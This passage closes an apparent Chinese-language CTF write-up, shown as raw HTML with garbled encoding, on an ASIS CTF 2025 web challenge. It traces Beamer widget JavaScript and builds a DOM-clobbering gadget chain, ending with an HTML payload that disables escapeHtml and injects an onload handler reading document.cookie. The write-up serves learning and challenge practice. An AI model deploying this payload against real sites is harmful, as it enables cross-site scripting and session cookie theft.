</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="s2">"undefined"</span> <span class="o">!==</span> <span class="k">typeof</span> <span class="nx">beamer_config</span><span class="p">.</span><span class="nx">display</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="s2">"in-app"</span> <span class="o">===</span> <span class="nx">beamer_config</span><span class="p">.</span><span class="nx">display</span> <span class="o">||</span> <span class="s2">"compact"</span> <span class="o">===</span> <span class="nx">beamer_config</span><span class="p">.</span><span class="nx">display</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span></code></pre></div><p>è€Œæˆ‘ä»¬è¿™é‡Œå› ä¸ºåœ¨åˆå§‹åŒ–çš„æ—¶å€™å¹¶æ²¡æœ‰ä¼ å…¥è¿™ä¸ªdisplayå‚æ•°ï¼Œæ‰€ä»¥è¿™é‡Œé»˜è®¤èµ°çš„æ˜¯beamerOberlayï¼Œä¹Ÿå°±æ˜¯ä¼šåˆ é™¤è¿™ä¸ªèŠ‚ç‚¹çš„Child,é‚£ä¹ˆæˆ‘ä»¬æ˜¯ä¸æ˜¯å¯ä»¥è¿™æ ·å­æ„é€ :</p>
<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">a</span> <span class="na">id</span><span class="o">=</span><span class="s">"beamerOverlay"</span><span class="p">&gt;&lt;</span><span class="nt">p</span> <span class="na">id</span><span class="o">=</span><span class="s">"Beamer"</span> <span class="na">name</span><span class="o">=</span><span class="s">"escapeHtml"</span><span class="p">&gt;&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>ä»è€Œåˆ é™¤æˆ‘ä»¬çš„escapeHtmlï¼Ÿ</p>
<p>æˆ‘ä»¬ç»§ç»­å¾€ä¸Šæ‰¾ï¼Œå› ä¸ºæˆ‘ä»¬æ²¡åŠæ³•æ§åˆ¶ç›´æ¥è°ƒç”¨è¿™ä¸ªå‡½æ•°</p>
<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">Beamer</span><span class="p">.</span><span class="nx">appendAlert</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">a</span><span class="p">,</span> <span class="nx">b</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// ...
</span></span></span><span class="line"><span class="cl">    <span class="kd">var</span> <span class="nx">l</span> <span class="o">=</span> <span class="nx">Beamer</span><span class="p">.</span><span class="nx">getConfigParameter</span><span class="p">(</span><span class="nx">f</span><span class="p">,</span> <span class="s2">"activateAutoRefresh"</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">Beamer</span><span class="p">.</span><span class="nx">isEmbedMode</span><span class="p">()</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="s2">"undefined"</span> <span class="o">===</span> <span class="k">typeof</span> <span class="nx">beamer_config</span><span class="p">.</span><span class="nx">auto_refresh</span> <span class="o">||</span> <span class="nx">beamer_config</span><span class="p">.</span><span class="nx">auto_refresh</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="s2">"undefined"</span> <span class="o">!==</span> <span class="k">typeof</span> <span class="nx">l</span> <span class="o">&amp;&amp;</span> <span class="nx">l</span> <span class="o">&amp;&amp;</span> <span class="s2">"undefined"</span> <span class="o">!==</span> <span class="k">typeof</span> <span class="nx">k</span> <span class="o">&amp;&amp;</span> <span class="nx">k</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">h</span> <span class="o">||</span> <span class="s2">"undefined"</span> <span class="o">!==</span> <span class="k">typeof</span> <span class="nx">b</span> <span class="o">&amp;&amp;</span> <span class="nx">b</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="nx">_BEAMER_IS_OPEN</span> <span class="o">?</span> <span class="nx">Beamer</span><span class="p">.</span><span class="nx">removeOnHide</span> <span class="o">=</span> <span class="o">!</span><span class="mi">0</span> <span class="o">:</span> <span class="nx">Beamer</span><span class="p">.</span><span class="nx">removeIframe</span><span class="p">(),</span>
</span></span></code></pre></div><p>åœ¨appenAlertä½ç½®è°ƒç”¨äº†ä»–ï¼Œå¹¶ä¸”åœ¨updateçš„åœ°æ–¹è°ƒç”¨äº†appendAlertè¿™ä¸ªå‡½æ•°</p>
<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">Beamer</span><span class="p">.</span><span class="nx">update</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">a</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="s2">"undefined"</span> <span class="o">!==</span> <span class="k">typeof</span> <span class="nx">a</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kd">var</span> <span class="nx">b</span> <span class="o">=</span> <span class="o">!</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// ...
</span></span></span><span class="line"><span class="cl">        <span class="s2">"undefined"</span> <span class="o">!==</span> <span class="k">typeof</span> <span class="nx">a</span><span class="p">.</span><span class="nx">language</span> <span class="o">&amp;&amp;</span> <span class="nx">beamer_config</span><span class="p">.</span><span class="nx">language</span> <span class="o">!==</span> <span class="nx">a</span><span class="p">.</span><span class="nx">language</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nx">beamer_config</span><span class="p">.</span><span class="nx">language</span> <span class="o">=</span> <span class="nx">a</span><span class="p">.</span><span class="nx">language</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nx">b</span> <span class="o">=</span> <span class="o">!</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// ...
</span></span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">c</span> <span class="k">in</span> <span class="nx">a</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nx">a</span><span class="p">.</span><span class="nx">hasOwnProperty</span><span class="p">(</span><span class="nx">c</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span> <span class="o">&lt;</span> <span class="nx">Beamer</span><span class="p">.</span><span class="nx">reservedParameters</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="nx">c</span><span class="p">)))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="kd">var</span> <span class="nx">d</span> <span class="o">=</span> <span class="nx">a</span><span class="p">[</span><span class="nx">c</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">                <span class="s2">"undefined"</span> <span class="o">===</span> <span class="k">typeof</span> <span class="nx">d</span> <span class="o">||</span> <span class="s2">"object"</span> <span class="o">===</span> <span class="k">typeof</span> <span class="nx">d</span> <span class="o">||</span> <span class="nx">Beamer</span><span class="p">.</span><span class="nx">isFunction</span><span class="p">(</span><span class="nx">d</span><span class="p">)</span> <span class="o">||</span> <span class="nx">beamer_config</span><span class="p">[</span><span class="nx">c</span><span class="p">]</span> <span class="o">===</span> <span class="nx">d</span> <span class="o">||</span> <span class="p">(</span><span class="nx">beamer_config</span><span class="p">[</span><span class="nx">c</span><span class="p">]</span> <span class="o">=</span> <span class="nx">d</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="nx">b</span> <span class="o">=</span> <span class="o">!</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="nx">b</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nx">Beamer</span><span class="p">.</span><span class="nx">started</span> <span class="o">?</span> <span class="nx">Beamer</span><span class="p">.</span><span class="nx">appendAlert</span><span class="p">(</span><span class="o">!</span><span class="mi">0</span><span class="p">,</span> <span class="o">!</span><span class="mi">0</span><span class="p">)</span> <span class="o">:</span> <span class="nx">Beamer</span><span class="p">.</span><span class="nx">init</span><span class="p">())</span> <span class="c1">// HERE
</span></span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>è€Œæ­£æ­£å¥½çš„æ˜¯æˆ‘ä»¬åœ¨åˆå§‹åŒ–çš„æ—¶å€™å°±æ˜¯ä¼ å…¥äº†Beamer.update({ language: â€œFRâ€ })ï¼Œä»è€Œå¯ä»¥è§¦å‘appendAlertï¼Œæ‰€ä»¥è¿™ä¸ªé“¾å­å°±å½¢æˆäº†
gadgetï¼š</p>
<pre tabindex="0"><code>update-&gt;appendAlert-&gt;removeIframe
</code></pre>
<h2 class="relative group">XSS gadget 
    <div class="anchor" id="xss-gadget"></div>
<span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
<a aria-label="Anchor" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#xss-gadget">#</a>
</span>
</h2>
<p>æœ€åä¸€ä¸ªåœ°æ–¹å°±æ˜¯æˆ‘ä»¬å¦‚ä½•å†™åˆ°innerHtmlï¼Œé…åˆæˆ‘ä»¬ä¸Šé¢remove escapeHtmlçš„gedget
æˆ‘ä»¬çœ‹åˆ°è¿™ä¸ªå‡½æ•°</p>
<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">Beamer</span><span class="p">.</span><span class="nx">appendUtilitiesIframe</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">a</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="s2">"undefined"</span> <span class="o">===</span> <span class="k">typeof</span> <span class="nx">Beamer</span><span class="p">.</span><span class="nx">config</span><span class="p">.</span><span class="nx">disableUtilitiesIframe</span> <span class="o">||</span> <span class="o">!</span><span class="nx">Beamer</span><span class="p">.</span><span class="nx">config</span><span class="p">.</span><span class="nx">disableUtilitiesIframe</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">"beamerUtilities"</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="kd">var</span> <span class="nx">b</span> <span class="o">=</span> <span class="s2">"undefined"</span> <span class="o">!==</span> <span class="k">typeof</span> <span class="nx">Beamer</span><span class="p">.</span><span class="nx">customDomain</span> <span class="o">?</span> <span class="nx">Beamer</span><span class="p">.</span><span class="nx">customDomain</span> <span class="o">:</span> <span class="nx">_BEAMER_URL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="nx">b</span> <span class="o">+=</span> <span class="s2">"utilities?app_id="</span> <span class="o">+</span> <span class="nx">beamer_config</span><span class="p">.</span><span class="nx">product_id</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="s2">"undefined"</span> <span class="o">!==</span> <span class="k">typeof</span> <span class="nx">Beamer</span><span class="p">.</span><span class="nx">escapeHtml</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nx">b</span> <span class="o">=</span> <span class="nx">Beamer</span><span class="p">.</span><span class="nx">escapeHtml</span><span class="p">(</span><span class="nx">b</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">                <span class="nx">Beamer</span><span class="p">.</span><span class="nx">appendHtml</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">,</span> <span class="s2">"&lt;iframe id='beamerUtilities' src='"</span> <span class="o">+</span> <span class="nx">b</span> <span class="o">+</span> <span class="s2">"' width='0' height='0' frameborder='0' scrolling='no'&gt;&lt;/iframe&gt;"</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="s2">"undefined"</span> <span class="o">!==</span> <span class="k">typeof</span> <span class="nx">Beamer</span><span class="p">.</span><span class="nx">customDomain</span> <span class="o">&amp;&amp;</span> <span class="nx">Beamer</span><span class="p">.</span><span class="nx">setIframeCookies</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">            <span class="s2">"undefined"</span> <span class="o">!==</span> <span class="k">typeof</span> <span class="nx">a</span> <span class="o">&amp;&amp;</span> <span class="nx">a</span> <span class="o">&amp;&amp;</span> <span class="nx">Beamer</span><span class="p">.</span><span class="nx">initUpdatesListener</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">c</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nx">Beamer</span><span class="p">.</span><span class="nx">logError</span><span class="p">(</span><span class="nx">c</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>å½“æˆ‘ä»¬Beamer.customDomainå­˜åœ¨çš„æ—¶å€™ï¼Œå°±å°†è¿™ä¸ªå€¼ç›´æ¥æ”¾åˆ°ä¸€ä¸ªiframeé‡Œé¢ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ„é€ å‡ºæ¥ä¸€ä¸ªè¿™æ ·å­çš„payload</p>
<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">a</span> <span class="na">id</span><span class="o">=</span><span class="s">"Beamer"</span> <span class="na">name</span><span class="o">=</span><span class="s">"customDomain"</span> <span class="na">href</span><span class="o">=</span><span class="s">"http:'/onload='console.log(document.cookie)'/x='"</span><span class="p">&gt;&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>è¿™é‡Œå› ä¸ºhttpæ˜¯å¯ä»¥èµ°è¿‡DOMPurifyçš„ï¼Œå¹¶ä¸”è¿™é‡Œçš„<code>'</code>ä¸æ˜¯url encodedè€Œæ˜¯å®ä½“ã€‚
å…·ä½“ï¼š







<figure>
<img alt="" class="my-0 rounded-md" loading="lazy" src="/img/ASIS-CTF-2025%e5%a4%8d%e7%8e%b0/11.png"/>
</figure>

è€ŒåŒæ ·çš„ï¼Œä½ å¯ä»¥å¾ˆæƒŠå¥‡çš„å‘ç°åœ¨appendAlertä¸­ï¼Œä»–ä¹Ÿè‡ªåŠ¨çš„è°ƒç”¨äº†appendUtilitiesIframeè¿™ä¸ªå‡½æ•°ï¼Œä½†æ˜¯å› ä¸ºæˆ‘ä»¬æŠŠescapeHtmlç»™è¦†ç›–æ‰äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬æ­¤æ—¶çš„escapHtmlæ˜¯ä¸€ä¸ª<code>HTMLCollection</code>çš„çŠ¶æ€ï¼Œæ‰€ä»¥åœ¨è°ƒç”¨</p>
<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">escapeHtml</span> <span class="o">=</span> <span class="nx">Beamer</span><span class="p">.</span><span class="nx">escapeHtml</span><span class="p">(</span><span class="nx">escapeHtml</span><span class="p">);</span>
</span></span></code></pre></div><p>çš„æ—¶å€™ä¼šæŠ¥é”™ï¼Œè€Œåœ¨å‰é¢è¿™ä¸ªå‡½æ•°é‡Œé¢å¯ä»¥çœ‹åˆ°</p>
<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">Beamer</span><span class="p">.</span><span class="nx">appendPushScript</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">a</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nx">Beamer</span><span class="p">.</span><span class="nx">isSafari</span><span class="p">()</span> <span class="o">||</span> <span class="nx">Beamer</span><span class="p">.</span><span class="nx">isIE</span><span class="p">()</span> <span class="o">||</span> <span class="nx">Beamer</span><span class="p">.</span><span class="nx">isFacebookApp</span><span class="p">()</span> <span class="o">||</span> <span class="nx">Beamer</span><span class="p">.</span><span class="nx">isInstagramApp</span><span class="p">()))</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="s2">"undefined"</span> <span class="o">!==</span> <span class="k">typeof</span> <span class="nx">Beamer</span><span class="p">.</span><span class="nx">pushDomain</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="p">(</span><span class="nx">Beamer</span><span class="p">.</span><span class="nx">pushDomain</span> <span class="o">==</span> <span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">host</span> <span class="o">||</span> <span class="s2">"undefined"</span> <span class="o">!==</span> <span class="k">typeof</span> <span class="nx">Beamer</span><span class="p">.</span><span class="nx">extendedPushDomain</span> <span class="o">&amp;&amp;</span> <span class="nx">Beamer</span><span class="p">.</span><span class="nx">extendedPushDomain</span> <span class="o">&amp;&amp;</span> <span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">host</span><span class="p">.</span><span class="nx">endsWith</span><span class="p">(</span><span class="s2">"."</span> <span class="o">+</span> <span class="nx">Beamer</span><span class="p">.</span><span class="nx">pushDomain</span><span class="p">))</span> <span class="o">&amp;&amp;</span> <span class="nx">Beamer</span><span class="p">.</span><span class="nx">appendPushPermissionScript</span><span class="p">(</span><span class="nx">a</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="s2">"undefined"</span> <span class="o">!==</span> <span class="k">typeof</span> <span class="nx">_BEAMER_PUSH_PROMPT_TYPE</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="s2">"popup"</span> <span class="o">==</span> <span class="nx">_BEAMER_PUSH_PROMPT_TYPE</span> <span class="o">||</span> <span class="s2">"sidebar"</span> <span class="o">==</span> <span class="nx">_BEAMER_PUSH_PROMPT_TYPE</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="c1">// ...
</span></span></span><span class="line"><span class="cl">            <span class="s2">"undefined"</span> <span class="o">!==</span> <span class="k">typeof</span> <span class="nx">Beamer</span><span class="p">.</span><span class="nx">escapeHtml</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nx">b</span> <span class="o">=</span> <span class="nx">Beamer</span><span class="p">.</span><span class="nx">escapeHtml</span><span class="p">(</span><span class="nx">b</span><span class="p">));</span> <span class="c1">// HERE
</span></span></span><span class="line"><span class="cl">            <span class="nx">Beamer</span><span class="p">.</span><span class="nx">appendHtml</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">,</span> <span class="s2">"&lt;iframe id='beamerPush' src='"</span> <span class="o">+</span> <span class="nx">b</span> <span class="o">+</span> <span class="s2">"' width='0' height='0' frameborder='0' scrolling='no'&gt;&lt;/iframe&gt;"</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>å½“pushDomainä¸ä¸ºundefinedçš„æ—¶å€™ï¼Œå°±ä¸ä¼šèµ°åˆ°è°ƒç”¨çš„ä½ç½®ä¹Ÿå°±ä¸ä¼šæŠ¥é”™äº†ã€‚</p>
<p>æ‰€ä»¥æœ€åpayload</p>
<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">p</span> <span class="na">id</span><span class="o">=</span><span class="s">"Beamer"</span> <span class="na">name</span><span class="o">=</span><span class="s">"pushDomain"</span><span class="p">&gt;&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">p</span> <span class="na">id</span><span class="o">=</span><span class="s">"Beamer"</span><span class="p">&gt;&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">a</span> <span class="na">id</span><span class="o">=</span><span class="s">"Beamer"</span> <span class="na">name</span><span class="o">=</span><span class="s">"customDomain"</span> <span class="na">href</span><span class="o">=</span><span class="s">"http:'"</span><span class="err">'"'/</span><span class="na">onload</span><span class="o">=</span><span class="s">'"'</span><span class="err">"'</span><span class="na">console</span><span class="err">.</span><span class="na">log</span><span class="err">(</span><span class="na">document</span><span class="err">.</span><span class="na">cookie</span><span class="err">)'"'"'/</span><span class="na">x</span><span class="o">=</span><span class="s">'"'</span><span class="err">"'"</span><span class="p">&gt;&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">a</span> <span class="na">id</span><span class="o">=</span><span class="s">"beamerOverlay"</span><span class="p">&gt;&lt;</span><span class="nt">p</span> <span class="na">id</span><span class="o">=</span><span class="s">"Beamer"</span> <span class="na">name</span><span class="o">=</span><span class="s">"escapeHtml"</span><span class="p">&gt;&lt;/</span><span class="nt">p</span><span class="p">&gt;&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
</span></span></code></pre></div>
</div>
<div class="flex author">
<img alt="Delete's blog" class="!mt-0 !mb-0 h-24 w-24 rounded-full ltr:mr-4 rtl:ml-4" height="96" src="/1_hu_b7169b4e89707ead.jpg" width="96"/>
<div class="place-self-center">
<div class="text-[0.6rem] uppercase leading-3 text-neutral-500 dark:text-neutral-400">
        Author
      </div>
<div class="font-semibold leading-6 text-neutral-800 dark:text-neutral-300">
        Deleteâ€™s blog
      </div>
<div class="text-2xl sm:text-lg">
<div class="flex flex-wrap text-neutral-400 dark:text-neutral-500">
<a aria-label="Email" class="px-1 hover:text-primary-700 dark:hover:text-primary-400" href="delete@student.gdufe.edu.cn" rel="me noopener noreferrer" target="_blank"><span class="inline-block align-text-bottom"><span class="relative block icon"><svg viewbox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><path d="M207.8 20.73c-93.45 18.32-168.7 93.66-187 187.1c-27.64 140.9 68.65 266.2 199.1 285.1c19.01 2.888 36.17-12.26 36.17-31.49l.0001-.6631c0-15.74-11.44-28.88-26.84-31.24c-84.35-12.98-149.2-86.13-149.2-174.2c0-102.9 88.61-185.5 193.4-175.4c91.54 8.869 158.6 91.25 158.6 183.2l0 16.16c0 22.09-17.94 40.05-40 40.05s-40.01-17.96-40.01-40.05v-120.1c0-8.847-7.161-16.02-16.01-16.02l-31.98 .0036c-7.299 0-13.2 4.992-15.12 11.68c-24.85-12.15-54.24-16.38-86.06-5.106c-38.75 13.73-68.12 48.91-73.72 89.64c-9.483 69.01 43.81 128 110.9 128c26.44 0 50.43-9.544 69.59-24.88c24 31.3 65.23 48.69 109.4 37.49C465.2 369.3 496 324.1 495.1 277.2V256.3C495.1 107.1 361.2-9.332 207.8 20.73zM239.1 304.3c-26.47 0-48-21.56-48-48.05s21.53-48.05 48-48.05s48 21.56 48 48.05S266.5 304.3 239.1 304.3z" fill="currentColor"></path></svg>
</span></span></a>
<a aria-label="Github" class="px-1 hover:text-primary-700 dark:hover:text-primary-400" href="https://github.com/ML-hacker" rel="me noopener noreferrer" target="_blank"><span class="inline-block align-text-bottom"><span class="relative block icon"><svg viewbox="0 0 496 512" xmlns="http://www.w3.org/2000/svg"><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z" fill="currentColor"></path></svg>
</span></span></a>
</div>
</div>
</div>
</div>
<div class="mb-10"></div>
</div>
<script data-oid="views_posts\ASIS CTF 2025å¤ç°\index.md" data-oid-likes="likes_posts\ASIS CTF 2025å¤ç°\index.md" src="/js/page.min.54b6f4371722649edbe871e431d8670d670878c22be8f36e229fe53cc9b786fe25a834def5e6de621f7a3e37b72bc8cd73839aa5ed907ed6cbd45cd3e1b0fa20.js" type="text/javascript"></script>
</section>
<footer class="pt-8 max-w-prose print:hidden">
<div class="pt-8">
<hr class="border-dotted border-neutral-300 dark:border-neutral-600"/>
<div class="flex justify-between pt-3">
<span>
<a class="flex group mr-3" href="/posts/tfcctf2025-webless/">
<span class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400">â†</span>
<span class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400">â†’</span>
<span class="flex flex-col">
<span class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500">TFCCTF2025 Webless</span>
<span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
<time datetime="2025-09-16T20:24:49+08:00">16 September 2025</time>
</span>
</span>
</a>
</span>
<span>
<a class="flex text-right group ml-3" href="/posts/0ctf-web/">
<span class="flex flex-col">
<span class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500">0CTF-éƒ¨åˆ†WEBå¤ç°</span>
<span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
<time datetime="2025-12-24T13:28:55+08:00">24 December 2025</time>
</span>
</span>
<span class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400">â†’</span>
<span class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400">â†</span>
</a>
</span>
</div>
</div>
</footer>
</article>
<div class="pointer-events-none absolute top-[110vh] bottom-0 w-12 ltr:right-0 rtl:left-0 z-10" id="top-scroller">
<a aria-label="Scroll to top" class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 mb-16 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400" href="#the-top" title="Scroll to top">
    â†‘
  </a>
</div>
</main><footer class="py-10 print:hidden" id="site-footer">
<nav class="flex flex-row pb-4 text-base font-medium text-neutral-500 dark:text-neutral-400 overflow-x-auto py-2">
<ul class="flex list-none flex-row">
<li class="flex mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0 ltr:mr-4 rtl:ml-4">
<a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2 flex items-center" href="" title="">
</a>
</li>
</ul>
</nav>
<div class="flex items-center justify-between">
<p class="text-xs text-neutral-500 dark:text-neutral-400">
        
        
        Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href="https://blowfish.page/" rel="noopener noreferrer" target="_blank">Blowfish</a>
</p>
</div>
<script>
      mediumZoom(document.querySelectorAll("img:not(.nozoom)"), {
        margin: 24,
        background: "rgba(0,0,0,0.5)",
        scrollOffset: 0,
      });
    </script>
